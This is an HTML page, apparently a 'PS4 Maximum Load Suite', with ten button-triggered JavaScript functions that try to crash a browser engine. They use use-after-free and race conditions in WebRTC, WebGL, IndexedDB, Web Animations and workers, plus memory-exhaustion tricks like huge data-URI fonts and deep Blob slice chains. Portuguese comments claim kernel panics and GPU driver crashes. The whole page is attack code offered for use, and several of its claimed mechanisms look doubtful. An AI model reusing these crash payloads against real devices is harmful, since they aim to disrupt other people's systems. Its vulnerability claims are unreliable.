<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Maximum Load Suite (v5000)</title>

</head>
<body>

        
    <div class="grid">
        <div class="category">
            <span class="cat-title">DOM LIFECYCLE & WORKERS (UAF)</span>
            
        </div>
<button onclick="crashSCTPStreamReset()">01. WebRTC SCTP Stream Reset UAF (NetBSD Kernel Panic)</button>
<button onclick="crashCanvasFontLoading()">02. Canvas fillText Font Loading Race (Layout Engine Crash)</button>
<button onclick="crashWebGLQueryAvailability()">03. WebGL Query Result Availability Race (GPU Driver Panic)</button>
<button onclick="crashRTCPeerConnectionGC()">04. RTCPeerConnection Garbage Collection Race (UAF)</button>
<button onclick="crashBlobSliceRecursion()">05. Blob.slice() Infinite Recursion (Kernel Stack Overflow)</button>
<button onclick="crashKeyframeEffectSource()">06. KeyframeEffect Source Buffer Mutation (Animation Crash)</button>
<button onclick="crashFileReaderSyncWorker()">07. FileReaderSync Worker Thread Detach (IO Panic)</button>
<button onclick="crashCSSFontFaceSrc()">08. CSS @font-face src descriptor Data URI Overflow</button>
<button onclick="crashIndexedDBUpgradeRace()">09. IndexedDB Version Upgrade Transaction Race (Database Corruption)</button>
<button onclick="crashWebGLShaderPrecision()">10. WebGL Shader Precision Qualifier Overflow (Compiler Crash)</button>
        
    </div>
<div id="console"></div>

   
<script>
function crashSCTPStreamReset() {
    // Vetor: SCTP Stream Reset Use-After-Free
    // Alvo: Kernel Network Stack / usrsctp
    // Lógica: Iniciar reset de stream e fechar a conexão simultaneamente.
    
    if (!window.RTCPeerConnection) return;
    const pc = new RTCPeerConnection();
    const dc = pc.createDataChannel("crash", {negotiated: true, id: 0});
    
    // Simula estado de conexão aberta (necessário tráfego real para crash total)
    // Força alocação de estruturas internas
    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(e=>{});
    
    setTimeout(() => {
        // Tenta fechar o canal (que envia reset SCTP)
        dc.close();
        
        // Imediatamente destrói a associação SCTP inteira
        pc.close();
        
        // Aloca lixo para preencher memória libertada
        const junk = new Array(5000).fill(0x41414141);
    }, 10);
}

function crashCanvasFontLoading() {
    // Vetor: Font Loading during Canvas Render
    // Alvo: WebCore RenderText / FontCache
    // Lógica: O Canvas tenta desenhar texto com uma fonte que ainda não carregou.
    // Se a fonte falhar ou carregar no meio do desenho, o ponteiro de face pode ser inválido.
    
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    const f = new FontFace("CrashFont", "url(http://localhost:9999/slow-font.woff)"); // URL lenta ou inválida
    document.fonts.add(f);
    
    f.load().catch(e=>{});
    
    // Loop de desenho frenético enquanto a fonte carrega
    const iv = setInterval(() => {
        ctx.font = "40px CrashFont";
        try {
            // Desenha texto massivo para manter a engine ocupada
            ctx.fillText("A".repeat(1000), 0, 50);
            
            // Tenta limpar a fonte do set no meio
            if(Math.random() > 0.5) document.fonts.clear();
            else document.fonts.add(f);
            
        } catch(e) {}
    }, 0);
    
    setTimeout(() => clearInterval(iv), 2000);
}

function crashWebGLQueryAvailability() {
    // Vetor: WebGL Query Availability Race
    // Alvo: GPU Driver (getQueryParameter)
    // Lógica: Consultar se o resultado da GPU está pronto (QUERY_RESULT_AVAILABLE).
    // Se deletarmos a Query enquanto o driver verifica o status, acessamos memória morta.
    
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl2');
    if(!gl) return;
    
    const q = gl.createQuery();
    gl.beginQuery(gl.ANY_SAMPLES_PASSED, q);
    
    // Desenha algo
    gl.clearColor(0,0,1,1);
    gl.clear(gl.COLOR_BUFFER_BIT);
    
    gl.endQuery(gl.ANY_SAMPLES_PASSED);
    
    // Race: Get Parameter vs Delete
    // Tentamos fazer isso o mais rápido possível
    try {
        // Loop para aumentar chance de colisão
        for(let i=0; i<100; i++) {
            // Checa disponibilidade (acessa driver)
            gl.getQueryParameter(q, gl.QUERY_RESULT_AVAILABLE);
            
            if (i === 50) {
                // Deleta no meio do loop
                gl.deleteQuery(q);
            }
        }
    } catch(e) {}
}

function crashRTCPeerConnectionGC() {
    // Vetor: RTCPeerConnection GC UAF
    // Alvo: WebRTC Signaling Thread
    // Lógica: Criar conexão, iniciar negociação assíncrona, e forçar GC do objeto JS.
    // Quando o callback nativo (C++) da negociação voltar, o objeto JS wrapper já morreu.
    
    function trigger() {
        let pc = new RTCPeerConnection();
        // Inicia operação assíncrona pesada
        pc.createOffer({offerToReceiveAudio: 1, offerToReceiveVideo: 1}).then(() => {
            // Callback vazio, mas o código nativo tentará acessar 'pc' aqui
        });
        
        // Remove referência forte
        pc = null;
    }
    
    // Cria milhares para garantir que o GC rode
    for(let i=0; i<1000; i++) {
        trigger();
    }
    
    // Pressão de memória auxiliar
    const pressure = [];
    for(let i=0; i<1000; i++) pressure.push(new Uint8Array(1024*100));
}

function crashBlobSliceRecursion() {
    // Vetor: Blob Slice Recursion
    // Alvo: BlobStorage / Kernel VFS
    // Lógica: Blob.slice() cria uma "view" sobre o blob original.
    // Fazer slices de slices recursivamente cria uma cadeia de referência profunda.
    // Ler o último slice força o kernel a resolver a cadeia inteira, estourando a stack.
    
    const buf = new ArrayBuffer(1024);
    let blob = new Blob([buf]);
    
    // Profundidade insana
    for(let i=0; i<20000; i++) {
        // Slice do slice anterior
        blob = blob.slice(0, 500); 
    }
    
    // Leitura força resolução da cadeia
    const fr = new FileReader();
    fr.readAsArrayBuffer(blob);
}

function crashKeyframeEffectSource() {
    // Vetor: Web Animations API Crash
    // Alvo: Animation Engine
    // Lógica: KeyframeEffect aceita um buffer de keyframes. Modificar esse buffer 
    // enquanto a animação está sendo composta pela thread de compositor.
    
    const div = document.createElement('div');
    document.body.appendChild(div);
    
    const frames = [{ opacity: 0 }, { opacity: 1 }];
    const effect = new KeyframeEffect(div, frames, { duration: 1000, iterations: Infinity });
    const anim = new Animation(effect, document.timeline);
    anim.play();
    
    // Mutação rápida de keyframes
    const iv = setInterval(() => {
        try {
            // Seta novos keyframes com dados inválidos/nulos misturados
            effect.setKeyframes([
                { opacity: Math.random() }, 
                { opacity: null }, // Null value handling?
                { transform: "translate3d(0,0,0)" }
            ]);
            
            // Tenta destruir o elemento alvo no meio da animação
            if(Math.random() > 0.95) {
                div.remove();
                clearInterval(iv);
            }
        } catch(e) {}
    }, 10);
}

function crashFileReaderSyncWorker() {
    // Vetor: FileReaderSync Worker Panic
    // Alvo: WebWorker IO
    // Lógica: FileReaderSync é síncrono. Se terminarmos o Worker enquanto ele está lendo
    // um Blob grande do disco/memória, interrompemos a syscall de leitura de forma suja.
    
    const blob = new Blob([new Uint8Array(1024*1024*50)]); // 50MB Blob
    
    const code = `
        onmessage = function(e) {
            const blob = e.data;
            const fr = new FileReaderSync();
            // Leitura bloqueante de 50MB
            fr.readAsArrayBuffer(blob);
            postMessage("done");
        }
    `;
    
    const w = new Worker(URL.createObjectURL(new Blob([code], {type: 'text/javascript'})));
    w.postMessage(blob);
    
    // Mata o worker após alguns ms (esperando pegar no meio do readAsArrayBuffer)
    setTimeout(() => {
        w.terminate(); 
    }, 10);
}

function crashCSSFontFaceSrc() {
    // Vetor: CSS Parser Buffer Overflow
    // Alvo: CSS Parser (@font-face)
    // Lógica: O descritor 'src' aceita data URIs. Se passarmos uma URI base64 gigantesca (>10MB)
    // inline no CSS, o parser pode estourar buffers de string na stack ou heap.
    
    const style = document.createElement('style');
    // Gera URI gigante
    const hugeBase64 = "A".repeat(1024 * 1024 * 10); 
    
    style.textContent = `
        @font-face {
            font-family: 'Crash';
            src: url('data:font/woff;base64,${hugeBase64}');
        }
    `;
    
    // Injeção força parsing síncrono
    document.head.appendChild(style);
    
    // Força uso
    document.body.style.fontFamily = 'Crash';
}

function crashIndexedDBUpgradeRace() {
    // Vetor: IndexedDB Transaction Race
    // Alvo: SQLite Backend / IDB Engine
    // Lógica: 'upgradeneeded' ocorre quando a versão muda. 
    // Se fecharmos o banco dentro do evento de upgrade e tentarmos comitar a transação...
    
    const req = indexedDB.open("CrashDB", Math.random()); // Nova versão sempre
    
    req.onupgradeneeded = function(e) {
        const db = e.target.result;
        const trans = e.target.transaction;
        
        // Cria store
        const store = db.createObjectStore("store");
        
        // Race: Aborta transação e fecha conexão simultaneamente
        trans.abort();
        db.close();
        
        try {
            // Tenta usar a store "zumbi"
            store.add("data", "key");
        } catch(e) {}
    };
}

function crashWebGLShaderPrecision() {
    // Vetor: GLSL Compiler Crash
    // Alvo: Shader Compiler (Driver GPU)
    // Lógica: WebGL permite qualificadores de precisão. Definir precisão 
    // de forma redundante ou conflitante em loops profundos pode quebrar o compilador.
    
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    
    let shaderSrc = "precision highp float;\nvoid main() {\n";
    // Gera complexidade aninhada
    for(let i=0; i<1000; i++) {
        shaderSrc += "float v" + i + " = " + i + ".0;\n";
    }
    // Operação massiva com todos
    shaderSrc += "gl_FragColor = vec4(";
    for(let i=0; i<1000; i++) shaderSrc += "v" + i + (i==999 ? "" : "+");
    shaderSrc += ", 0, 0, 1);\n}";
    
    const s = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(s, shaderSrc);
    // Compilação pesada
    gl.compileShader(s);
    
    // Checa status (força espera do driver)
    gl.getShaderParameter(s, gl.COMPILE_STATUS);
}

    </script>
    </body>
    </html>
    
